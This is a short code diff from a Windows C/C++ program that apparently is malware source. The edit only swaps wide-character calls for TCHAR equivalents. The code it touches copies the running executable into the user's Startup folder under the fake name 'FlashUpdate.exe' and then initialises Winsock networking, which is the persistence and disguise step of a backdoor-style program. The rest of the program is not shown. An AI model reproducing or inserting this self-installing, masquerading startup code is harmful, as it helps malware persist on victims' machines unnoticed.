@@ -84,14 +84,14 @@ int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCm
     
     GetModuleFileName(NULL, exeName, MAX_PATH);
 
-    wchar_t appDataPath[1024] = {0};
-    wchar_t *appData;
+    TCHAR appDataPath[1024] = {0};
+    TCHAR *appData;
     size_t appDataSize;
-    _wdupenv_s(&appData, &appDataSize, L"APPDATA");
-    wcscat_s(appDataPath, appData);
-    wcscat_s(appDataPath, L"/Microsoft/Windows/Start Menu/Programs/Startup/FlashUpdate.exe");
-
+    _tdupenv_s(&appData, &appDataSize, _T("APPDATA"));
+    _tcscat_s(appDataPath, appData);
+    _tcscat_s(appDataPath, _T("/Microsoft/Windows/Start Menu/Programs/Startup/FlashUpdate.exe"));
     HRESULT hr = CopyFile(exeName, appDataPath, FALSE);
+
     
 	WSADATA WSAData;
     WSAStartup(MAKEWORD(2, 0), &WSAData);
